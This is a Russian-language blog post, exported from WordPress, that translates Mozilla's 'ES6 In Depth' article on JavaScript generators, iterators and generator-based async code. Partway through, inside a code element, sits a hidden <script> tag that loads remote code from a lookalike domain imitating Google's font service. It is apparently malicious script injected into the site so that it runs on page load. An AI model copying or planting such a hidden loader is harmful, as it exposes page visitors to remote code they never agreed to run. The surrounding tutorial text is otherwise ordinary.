---
layout: post
status: publish
published: true
title: 'ES6 в деталях: Генераторы'
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
wordpress_id: 1481
wordpress_url: http://magazine.loc/%d0%b1%d0%b5%d0%b7-%d1%80%d1%83%d0%b1%d1%80%d0%b8%d0%ba%d0%b8/es6-%d0%b2-%d0%b4%d0%b5%d1%82%d0%b0%d0%bb%d1%8f%d1%85-%d0%b3%d0%b5%d0%bd%d0%b5%d1%80%d0%b0%d1%82%d0%be%d1%80%d1%8b/
date: '2015-05-28 00:00:00 +0200'
date_gmt: '2015-05-28 00:00:00 +0200'
categories:
- Верстка
tags:
- ip
- spl
- javascript
- js
- ui
- api
- frontender
comments: []
---
<p><em><a href="https:&#47;&#47;hacks.mozilla.org&#47;category&#47;es6-in-depth&#47;">ES6 в деталях<&#47;a> &mdash; это цикл статей о новых возможностях языка<br />
программирования JavaScript, появившихся в 6 редакции стандарта ECMAScript,<br />
кратко &mdash; ES6.<&#47;em></p>
<p>Мне не терпится вам всё рассказать. Сегодня мы будем обсуждать самую волшебную<br />
функциональность в ES6.</p>
<p>Что я имел в виду под словом &laquo;волшебную&raquo;? Во-первых, эта функциональность<br />
настолько отличается от всего того, что уже есть в JS, что поначалу может<br />
показаться колдовством. В том смысле, что она выворачивает обычное поведение<br />
языка наизнанку! Если это не магия, то я не знаю, что это.</p>
<p>Но не только поэтому. Возможности этой фичи по упрощению кода и устранению<br />
&laquo;ада колбеков&raquo; граничат со сверхъестественным.</p>
<p>Я излишне нахваливаю? Давайте углубимся, и вы сами рассудите.</p>
<h2>Знакомьтесь, генераторы ES6<&#47;h2><br />
Что такое генераторы?</p>
<p>Начнём с рассмотрения одного генератора:</p>
<pre><code>function* quips(name) {<br />
  yield "привет, " + name + "!";<br />
  yield "я надеюсь, вам нравятся статьи";<br />
  if (name.startsWith("X")) {<br />
    yield "как круто, что ваше имя начинается с X, " + name;<br />
  }<br />
  yield "увидимся!";<br />
}<br />
<&#47;code><&#47;pre><br />
Это часть кода для <a href="http:&#47;&#47;people.mozilla.org&#47;~jorendorff&#47;demos&#47;meow.html">говорящей кошки<&#47;a>, возможно, самого важного вида<br />
приложений в интернете на сегодняшний день. (Давайте,<br />
<a href="http:&#47;&#47;people.mozilla.org&#47;~jorendorff&#47;demos&#47;meow.html">нажмите на ссылку, поиграйте с кошкой<&#47;a>. Когда вы окончательно запутаетесь,<br />
возвращайтесь сюда за объяснением.)</p>
<p>Выглядит как-то похоже на функцию, верно? Это называется, <em>функция-генератор<&#47;em>,<br />
и у неё есть много общего с обычными функциями. Но вы можете заметить два<br />
отличия уже сейчас:</p>
<ul>
<li>Обычные функции начинаются с <code>function<&#47;code>. Функции-генераторы начинаются с<br />
<code>function*<&#47;code>.<&#47;li></p>
<li>Внутри функции-генератора есть ключевое слово <code>yield<&#47;code> с синтаксисом, похожим<br />
на <code>return<&#47;code>. Отличие в том, что функция (в том числе функция-генератор) может<br />
вернуть значение только один раз, но отдать значение функция-генератор может<br />
любое количество раз. Выражение <code>yield<&#47;code> <em>приостанавливает выполнение<br />
генератора, так что его можно позже возобновить<&#47;em>.<&#47;li><br />
<&#47;ul><br />
Вот, именно в этом самая большая разница между обычными функциями и<br />
функциями-генераторами. Обычные функции не могут поставить себя на паузу.<br />
Функции-генераторы могут.</p>
<h2>Что делают генераторы<&#47;h2><br />
Что произойдёт, если запустить функцию-генератор <code>quips()<&#47;code>?</p>
<pre><code>> var iter = quips("jorendorff");<br />
  [object Generator]<br />
> iter.next()<br />
  { value: "привет, jorendorff!", done: false }<br />
> iter.next()<br />
  { value: "я надеюсь, вам нравятся статьи", done: false }<br />
> iter.next()<br />
  { value: "увидимся!", done: false }<br />
> iter.next()<br />
  { value: undefined, done: true }<br />
<&#47;code><&#47;pre><br />
Возможно, вы очень привыкли к обычным функциям и тому, как они себя ведут.<br />
Когда их вызывают, они сразу же начинают выполняться и выполняются до тех пор,<br />
пока не вернут значение или не бросят исключение. Такое поведение само собой<br />
разумеется для любого JS-программиста.</p>
<p>Вызов генератора выглядит так же: <code>quips("jorendorff")<&#47;code>. Но после того, как вы<br />
вызовете генератор, он ещё не начнёт выполняться. Вместо этого он вернёт<br />
приостановленный <em>объект Generator<&#47;em> (в примере выше он под именем <code>iter<&#47;code>).<br />
Вы можете считать, что объект Generator &mdash; это вызов функции, замороженный во<br />
времени. Если точнее, он заморожен прямо в самом начале функции-генератора,<br />
перед первой строчкой кода.</p>
<p>Каждый раз, как вы вызываете метод <code>.next()<&#47;code> у объекта Generator, вызов функции<br />
оттаивает и выполняется, пока не достигнет следующего выражения <code>yield<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code>.</p>
<p>Вот почему в примере выше после вызовов <code>iter.next()<&#47;code> мы всякий раз получали<br />
новое строковое значение. Эти значения производятся выражениями <code>yield<&#47;code> в теле<br />
<code>quips()<&#47;code>.</p>
<p>При последнем вызове <code>iter.next()<&#47;code> мы, наконец, достигли конца<br />
функции-генератора, так что поле <code>.done<&#47;code> результата стало равно <code>true<&#47;code>.<br />
Добраться до конца функции &mdash; это всё равно что вернуть <code>undefined<&#47;code>, и именно<br />
поэтому поле <code>.value<&#47;code> результата равно <code>undefined<&#47;code>.</p>
<p>Похоже, сейчас самое время вернуться к <a href="http:&#47;&#47;people.mozilla.org&#47;~jorendorff&#47;demos&#47;meow.html">странице с говорящей кошкой<&#47;a> и<br />
как следует поиграться с кодом. Попробуйте добавить <code>yield<&#47;code> внутрь цикла.<br />
Что произойдёт?</p>
<p>Говоря техническим языком, каждый раз, когда генератор отдаёт значение, его<br />
<em>стековый кадр<&#47;em>: локальные переменные, аргументы, временные значения и текущая<br />
позиция точки выполнения внутри тела генератора&nbsp;&mdash; удаляется из стека.<br />
Однако, объект Generator хранит ссылку на этот стековый кадр (или его копию),<br />
так что последующий вызов <code>.next()<&#47;code> возобновит его и продолжит выполнение.</p>
<p>Стоит заметить, что <strong>генераторы не потоки выполнения<&#47;strong>. В языках с потоками<br />
различные куски кода могут выполняться одновременно, обычно приводя к состояниям<br />
гонки, недетерминированности и страстно желанному приросту производительности.<br />
Генераторы вообще на это не похожи. Когда генератор выполняется, он работает<br />
в том же потоке, что и код его вызвавший. Порядок выполнения последователен<br />
и строго определён, и нет никакой параллельности. В отличие от системных<br />
потоков, генератор останавливается только на тех местах, где в коде есть<br />
<code>yield<&#47;code>.</p>
<p>Хорошо. Теперь мы знаем, что такое, генераторы. Мы видели, как генераторы<br />
выполняются, приостанавливаются и возобновляют выполнение. Теперь хороший<br />
вопрос: как эти странные возможности могут нам пригодиться?</p>
<h2>Генераторы &mdash; итераторы<&#47;h2><br />
На прошлой неделе мы увидели, что в ES6 итераторы не просто один встроенный<br />
класс. Они &mdash; точка расширения языка. Вы можете создавать собственные итераторы,<br />
и для этого нужно лишь реализовать два метода: <code>[Symbol.iterator]()<&#47;code> и<br />
<code>.next()<&#47;code>.</p>
<p>Но реализация интерфейса &mdash; это всегда работа, по меньшей мере, небольшая.<br />
Взглянем, как реализация итератора выглядит на практике. В качестве примера<br />
возьмём простой итератор <code>range<&#47;code>, который всего-навсего считает от одного<br />
числа до другого, как в старомодном цикле <code>for (;;)<&#47;code> из C.</p>
<pre><code>&#47;&#47; Должно "прозвенеть" трижды<br />
for (var value of range(0, 3)) {<br />
  alert("Динь! на этаже № " + value);<br />
}<br />
<&#47;code><&#47;pre><br />
Вот одно решение, с использованием класса ES6. (Если синтаксис <code>class<&#47;code> вам<br />
не до конца ясен, не волнуйтесь, мы разберём его в одной из будущих статей.)</p>
<pre><code>class RangeIterator {<br />
  constructor(start, stop) {<br />
    this.value = start;<br />
    this.stop = stop;<br />
  }</p>
<p>  [Symbol.iterator]() { return this; }</p>
<p>  next() {<br />
    var value = this.value;<br />
    if (value < this.stop) {<br />
      this.value++;<br />
      return {done: false, value: value};<br />
    } else {<br />
      return {done: true, value: undefined};<br />
    }<br />
  }<br />
}</p>
<p>&#47;&#47; Возвращает новый итератор, который считает от 'start' до 'stop'.<br />
function range(start, stop) {<br />
  return new RangeIterator(start, stop);<br />
}<br />
<&#47;code><&#47;pre><br />
<a href="http:&#47;&#47;codepen.io&#47;anon&#47;pen&#47;NqGgOQ">Посмотрите на код в действии.<&#47;a></p>
<p>Так реализация итератора выглядит в <a href="http:&#47;&#47;gafter.blogspot.com&#47;2007&#47;07&#47;internal-versus-external-iterators.html">Java<&#47;a> или <a href="https:&#47;&#47;schani.wordpress.com&#47;2014&#47;06&#47;06&#47;generators-in-swift&#47;">Swift<&#47;a>. Неплохо. Но<br />
вместе с тем и нетривиально. Есть ли ошибки в этом коде? Трудно сказать. Это<br />
выглядит совершенно непохоже на изначальный цикл <code>for (;;)<&#47;code>, который мы пытаемся<br />
эмулировать: протокол итераторов заставляет нас разобрать этот цикл на части.</p>
<p>В этом месте вы можете слегка охладеть к итераторам. Может, ими и здорово<br />
<em>пользоваться<&#47;em>, но вот реализовывать их трудно.</p>
<p>Вам, возможно, не пришло бы в голову предлагать добавить новую, пугающую и<br />
мозголомную структуру потока выполнения в язык JS просто чтобы стало легче<br />
писать итераторы. Но раз уж у нас <em>уже<&#47;em> есть генераторы, можем ли мы их тут<br />
применить? Давайте попробуем:</p>
<pre><code>function* range(start, stop) {<br />
  for (var i = start; i < stop; i++)<br />
    yield i;<br />
}<br />
<&#47;code><&#47;pre><br />
<a href="http:&#47;&#47;codepen.io&#47;anon&#47;pen&#47;mJewga">Посмотрите на код в действии.<&#47;a></p>
<p>Вот этот генератор из 4 строчек полностью заменяет предыдущую 23-строчную<br />
реализацию <code>range()<&#47;code>, включая весь класс <code>RangeIterator<&#47;code> целиком.<br />
Это возможно потому что <strong>генераторы &mdash; это итераторы<&#47;strong>. У всех генераторов есть<br />
встроенная реализация <code>.next()<&#47;code> и <code>[Symbol.iterator]()<&#47;code>. Всё, что вам нужно &mdash;<br />
это описать поведение цикла.</p>
<p>Реализация итераторов без генераторов похожа на случай, когда нужно написать длинное<br />
электронное письмо используя только пассивный залог. Когда нельзя просто сказать<br />
то, что имеется в виду, речь в итоге получается весьма запутанной.<br />
<code>RangeIterator<&#47;code> длинный и странный потому что он должен описывать<br />
функциональность цикла не используя синтаксис циклов. Генераторы &mdash; ответ на это.</p>
<p>Для чего ещё можно применить возможность генераторов вести себя как итераторы?</p>
<ul>
<li><strong>Преобразование любого объекта в итерируемый.<&#47;strong> Просто напишите<br />
функцию-генератор, которая перебирает <code>this<&#47;code>, отдавая каждое значение по<br />
мере работы. Затем установите её объекту как метод <code>[Symbol.iterator]<&#47;code>.<&#47;li></p>
<li><strong>Упрощение функций, создающих массивы<&#47;strong>. Предположим, у вас есть функция,<br />
которая каждый раз при вызове возвращает массив, вроде такой:</p>
<pre><code>&#47;&#47; Делим одномерный массив 'icons'<br />
&#47;&#47; на массивы длиной 'rowLength'.<br />
function splitIntoRows(icons, rowLength) {<br />
  var rows = [];<br />
  var nRows = Math.ceil(icons.length &#47; rowLength);<br />
  for (var i = 0; i < icons.length; i += rowLength) {<br />
    rows.push(icons.slice(i, i + rowLength));<br />
  }<br />
  return rows;<br />
}<br />
<&#47;code><&#47;pre><br />
Генераторы могут немного укоротить этот код:</p>
<pre><code>function* splitIntoRows(icons, rowLength) {<br />
  var nRows = Math.ceil(icons.length &#47; rowLength);<br />
  for (var i = 0; i < icons.length; i += rowLength) {<br />
    yield icons.slice(i, i + rowLength);<br />
  }<br />
}<br />
<&#47;code><&#47;pre><br />
Единственная разница в поведении: вместо того, чтобы вычислять все<br />
результаты сразу и возвращать их в виде массива, мы возвращаем итератор, и<br />
результаты вычисляются по одному по мере необходимости.<&#47;li></p>
<li><strong>Результаты необычной длины.<&#47;strong> Вы не можете создать массив бесконечной<br />
длины. Но вы можете вернуть генератор, который генерирует бесконечную<br />
последовательность, и вызывающий код может взять оттуда сколько угодно<br />
значений.<&#47;li></p>
<li><strong>Рефакторинг сложных циклов.<&#47;strong> У вас есть огромная страшная функция?<br />
Вам хотелось бы разбить её на две более простые части? Генераторы &mdash; это<br />
новый нож в ваш набор инструментов для рефакторинга. Когда вы сталкиваетесь<br />
со сложным циклом, вы можете <em>вынести часть кода, производящего данные<&#47;em>,<br />
превращая его в отдельную функцию-генератор. А затем изменить цикл на,<br />
скажем, <code>for (var&nbsp;data of myNewGenerator(args))<&#47;code>.<&#47;li></p>
<li><strong>Утилиты для работы с итерируемыми объектами.<&#47;strong> ES6 <em>не<&#47;em> предоставляет<br />
обширную библиотеку для фильтрации, мэппинга или вообще каких-нибудь<br />
манипуляций с произвольными итерируемыми наборами данных. Но зато генераторы<br />
отлично подходят для написания любой утилиты, какая вам понадобится, всего<br />
в несколько строчек.</p>
<p>К примеру, предположим, вам нужен эквивалент <code>Array.prototype.filter<&#47;code>,<br />
работающий с <code>NodeList<&#47;code> из DOM, а не просто с массивами. Проще простого:</p>
<pre><code>function* filter(test, iterable) {<br />
  for (var item of iterable) {<br />
    if (test(item))<br />
      yield item;<br />
  }<br />
}<br />
<&#47;code><&#47;pre><br />
<&#47;li><br />
<&#47;ul><br />
Итак, генераторы полезны? Разумеется. Это удивительно лёгкий способ реализации<br />
собственных итераторов, а итераторы &mdash; это новый стандарт для данных и циклов<br />
во всём ES6.</p>
<p>Но это ещё не всё, что генераторы могут делать. Может даже выясниться, что это<br />
даже не самое важное из того, что они делают.</p>
<h2>Генераторы и асинхронный код<&#47;h2><br />
Вот такой код JS я писал раньше:</p>
<pre><code>          };<br />
        })<br />
      });<br />
    });<br />
  });<br />
});<br />
<&#47;code><&#47;pre><br />
Может быть, вы встретите что-то похожее в своём коде. <a href="http:&#47;&#47;www.html5rocks.com&#47;en&#47;tutorials&#47;async&#47;deferred&#47;">Асинхронные APIs<&#47;a><br />
обычно требуют колбеков, поэтому приходится писать очередную анонимную<br />
функцию всякий раз, когда что-то делаешь. И если у вас есть кусок кода, который<br />
делает три вещи, вместо трёх строчек кода вы видите три <em>уровня отступов<&#47;em> кода.</p>
<p>Вот ещё кое-что из того JS-кода, что я писал:</p>
<pre><code>}).on('close', function () {<br />
  done(undefined, undefined);<br />
}).on('error', function (error) {<br />
  done(error);<br />
});<br />
<&#47;code><&#47;pre><br />
В асинхронных API используются соглашения об обработке ошибок вместо исключений.<br />
У разных API могут быть разные соглашения. В большинстве из них ошибки просто<br />
игнорируются по умолчанию. В некоторых из них игнорируется по умолчанию даже<br />
обычное успешное выполнение.</p>
<p>До нынешнего момента эти проблемы были необходимой платой за асинхронное<br />
программирование. Мы свыклись с тем, что асинхронный код просто не выглядит<br />
так же красиво и просто, как такой же синхронный.</p>
<p>Генераторы дают нам новую надежду, что это так не останется.</p>
<p><a href="https:&#47;&#47;github.com&#47;kriskowal&#47;q&#47;tree&#47;v1&#47;examples&#47;async-generators">Q.async()<&#47;a> &mdash; это экспериментальная попытка сделать асинхронный код похожим<br />
на синхронный при помощи генераторов и промисов. К примеру:</p>
<pre><code>&#47;&#47; Синхронный код, производящий шум<br />
function makeNoise() {<br />
  shake();<br />
  rattle();<br />
  roll();<br />
}</p>
<p>&#47;&#47; Асинхронный код, производящий шум<br />
&#47;&#47; Возвращает объект Promise, который разрешится,<br />
&#47;&#47; когда мы закончим шуметь<br />
function makeNoise_async() {<br />
  return Q.async(function* () {<br />
    yield shake_async();<br />
    yield rattle_async();<br />
    yield roll_async();<br />
  });<br />
}<br />
<&#47;code><&#47;pre><br />
Основное отличие в том, что в асинхронной версии нужно добавлять ключевое слово<br />
<code>yield<&#47;code> перед любым вызовом асинхронной функции.</p>
<p>Если добавить конструкции вроде <code>if<&#47;code> или <code>try<&#47;code>&#47;<code>catch<&#47;code> в версию <code>Q.async<&#47;code>,<br />
то всё будет работать точно так же, как если бы их добавили в синхронный код.<br />
По сравнению с другими способами написания асинхронного кода этот меньше всего<br />
ощущается как изучение нового языка.</p>
<p>Если вы дочитали до этого места, возможно, вам понравится<br />
<a href="http:&#47;&#47;jlongster.com&#47;A-Study-on-Solving-Callbacks-with-JavaScript-Generators">очень подробная статья по этой теме<&#47;a> от Джеймса Лонга (James Long).</p>
<p>Итак, генераторы освещают наш путь к новой модели асинхронного программирования,<br />
которая, кажется, лучше подходит для человеческого мозга.<br />
Эта работа ещё не окончена. Среди всего прочего, может помочь синтаксис получше.<br />
<a href="https:&#47;&#47;github.com&#47;lukehoban&#47;ecmascript-asyncawait">Предложение асинхронных функций<&#47;a>, работающих на промисах и генераторах и<br />
вдохновлённых похожими возможностями в C#, уже внесено<br />
в <a href="https:&#47;&#47;github.com&#47;tc39&#47;ecma262">таблицу на включение в ES7<&#47;a>.</p>
<h2>Когда можно воспользоваться этими безумными вещами?<&#47;h2><br />
На сервере вы можете применять генераторы уже сегодня в io.js (или в Node с<br />
параметром командной строки <code>--harmony<&#47;code>).</p>
<p>Из браузеров пока что генераторы поддерживают только Firefox 27+ и Chrome 39+.<br />
Чтобы применять генераторы в вебе, придётся воспользоваться <a href="http:&#47;&#47;babeljs.io&#47;">Babel<&#47;a> или<br />
<a href="https:&#47;&#47;github.com&#47;google&#47;traceur-compiler#what-is-traceur">Traceur<&#47;a> и транслировать код ES6 в понятный всем браузерам ES5.</p>
<p>Ещё кое-что, что нельзя не упомянуть: Генераторы впервые были реализованы в JS<br />
Бренданом Айком (Brendan Eich), и его подход очень напоминал<br />
<a href="https:&#47;&#47;www.python.org&#47;dev&#47;peps&#47;pep-0255&#47;">генераторы в Python<&#47;a>, которые в свою очередь были вдохновлены <a href="http:&#47;&#47;www.cs.arizona.edu&#47;icon&#47;">Icon<&#47;a>.<br />
Они появились в Firefox <a href="https:&#47;&#47;developer.mozilla.org&#47;en-US&#47;docs&#47;Web&#47;JavaScript&#47;New_in_JavaScript&#47;1.7">в далёком 2006<&#47;a>. Путь к стандартизации был<br />
непростым, синтаксис и поведение за это время немного поменялись.<br />
Генераторы ES6 были реализованы как в Firefox, так и в Chrome мастером<br />
компиляции <a href="http:&#47;&#47;wingolog.org&#47;">Энди Винго (Andy Wingo)<&#47;a>. Его работа спонсировалась Bloomberg.</p>
<h2><code>yield;<&#47;code><&#47;h2><br />
О генераторах ещё можно многое рассказать. Мы не рассмотрели методы <code>.throw()<&#47;code><br />
и <code>.return()<&#47;code>, необязательные аргументы <code>.next()<&#47;code> и синтаксис выражения<br />
<code>yield*<&#47;code>.<br />
Но я считаю, что эта статья уже достаточно длинная, и из неё и так можно узнать<br />
много нового. Как и генераторы, мы пока приостановимся и закончим позднее.</p>
<p>Но на следующей неделе давайте немного сменим тему. Мы охватили две сложные темы<br />
подряд. Разве не было бы здорово в следующий раз поговорить о функциональности<br />
ES6, которая <em>не изменит<&#47;em> вашу жизнь? О чем-нибудь простом и очевидно полезном?<br />
О чём-то, что вызовет у вас улыбку? В ES6 и такое есть.</p>
<p>В следующей статье: фича, которая <em>прекрасно подойдёт<&#47;em> к любому коду, который вы<br />
пишете каждый день. Присоединяйтесь на следующей неделе и мы рассмотрим<br />
шаблоны строк в деталях.</p>
<p><img src="http:&#47;&#47;feeds.feedburner.com&#47;~r&#47;FrontenderMagazineArticles&#47;~4&#47;drWf8iTJcwE" alt="" width="1" height="1" &#47;><br />
Source: http:&#47;&#47;frontender.info&#47;</p>
